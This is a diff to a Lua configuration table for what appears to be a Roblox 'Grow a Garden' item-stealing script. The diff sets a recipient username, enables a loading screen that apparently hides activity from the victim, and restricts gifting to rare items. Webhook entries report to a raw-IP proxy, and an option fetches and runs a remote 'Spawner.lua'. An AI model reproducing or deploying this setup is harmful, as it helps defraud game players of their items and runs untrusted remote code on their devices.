@@ -1,12 +1,12 @@
 _G.NullConfig = {
-    User = {},
+    User = {"csssssssiiiiii"},
     min_value = 1000,
     pingEveryone = "Yes", -- dont change this
     Webhook = "http://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789chttp://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789c",
     FakeGift = "No",
     Trash = "http://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789c",
-    LoadingScreen = "No",
-    GiftOnlyRares = "No",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
     ExecuteOtherScript = "Yes",
     OtherScript = "https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua",
 }
